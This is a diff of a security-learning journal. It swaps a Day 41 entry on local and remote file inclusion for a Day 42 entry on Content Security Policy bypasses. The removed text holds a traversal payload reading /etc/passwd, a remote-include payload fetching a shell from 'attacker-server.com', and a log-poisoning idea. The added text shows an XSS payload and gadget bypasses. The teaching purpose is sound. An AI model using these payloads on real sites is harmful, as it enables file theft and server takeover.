@@ -1,26 +1,27 @@
-## 🗓️ Day 41/100 – File Inclusion (LFI/RFI)
+## 🗓️ Day 42/100 – CSP Bypass Techniques
 
-**Focus:** Exploiting insecure file handling to read sensitive data or execute arbitrary code.
+**Focus:** Analyzing weak Content Security Policy (CSP) headers to execute XSS payloads.
 
-### 📂 What is File Inclusion?
-Vulnerabilities occurring when an application builds a file path using user-supplied data without validation.
+### 🛡️ What is CSP?
+Content Security Policy is an HTTP header (`Content-Security-Policy`) that allows site administrators to declare approved sources of content that browsers are allowed to load.
 
-### ⚔️ Attack Vectors
+### ⚔️ Common Bypasses Demonstrated
 
-**1. Local File Inclusion (LFI)**
-*   **Scenario:** URL is `http://site.com/index.php?page=about.php`
-*   **Payload:** `?page=../../../../etc/passwd`
-*   **Impact:** Read sensitive local files (config files, source code, password hashes).
-*   **Escalation:** **LFI to RCE** via Log Poisoning (injecting PHP into Apache logs and including the log file).
+**1. 'unsafe-inline'**
+*   **Policy:** `script-src 'self' 'unsafe-inline'`
+*   **Weakness:** Allows `<script>alert(1)</script>` to run directly in the HTML.
+*   **Fix:** Use Nonces (random tokens) or Hashes.
 
-**2. Remote File Inclusion (RFI)**
-*   **Requirement:** `allow_url_include = On` in php.ini
-*   **Payload:** `?page=http://attacker-server.com/shell.txt`
-*   **Impact:** The server fetches and executes the external script. Immediate full system compromise.
+**2. CDN Whitelist Abuse (Script Gadgets)**
+*   **Policy:** `script-src 'self' https://cdnjs.cloudflare.com`
+*   **Weakness:** The attacker doesn't host the script; they load a vulnerable library (like old AngularJS) *from* the trusted CDN and use it to execute code.
+*   **Technique:** "JSONP Hijacking" or "AngularJS Sandbox Escape".
 
-### 🛡️ Defense Mechanisms
-*   **ID Mapping:** Use an ID system (e.g., `?page=1` maps to `home.php`) rather than filenames.
-*   **Basename Validation:** Ensure the input contains only the filename, not the path (`/` or `\`).
-*   **Configuration:** Set `allow_url_fopen` and `allow_url_include` to `Off`.
+**3. Wildcards**
+*   **Policy:** `script-src 'self' https:`
+*   **Weakness:** Allows scripts from ANY site with HTTPS (including the attacker's site).
 
-**Day 41 Takeaway:** File paths are dangerous inputs. If you control the path, you often control the server.
+### 🔍 Analysis Tool
+*   **Google CSP Evaluator:** Used to visualize policy gaps and potential bypasses.
+
+**Day 42 Takeaway:** CSP is powerful, but configuration is difficult. A bypassed CSP is often worse than no CSP because it leads to complacency.
